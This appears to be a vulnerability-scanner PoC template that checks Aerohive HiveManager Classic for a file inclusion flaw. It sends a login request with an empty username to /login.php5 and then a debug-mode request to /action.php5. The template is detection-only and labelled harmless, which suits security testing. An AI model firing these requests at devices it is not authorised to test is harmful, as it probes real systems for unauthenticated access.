name: yaml-poc-aerohive-hivemanager_classic-file_inclusion-CT-602946
binding: 5deefd73-23a4-4066-ac22-74e00bbd21c3
detail:
    author: haiqing.chen
    vulnerability:
        id: c54b3820-57c8-4721-ab97-0568da7f233e
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /login.php5
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: login_auth=0&miniHiveUI=1&authselect=1&userName=&password=a
        expression: response.status == 200 && response.body_string.contains("window.location")
    r1:
        request:
            cache: true
            method: POST
            path: /action.php5?_action=list&debug=true
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: _page=a
        expression: response.status == 302 && response.body_string.contains("hiawatha")
expression: r0() && r1()
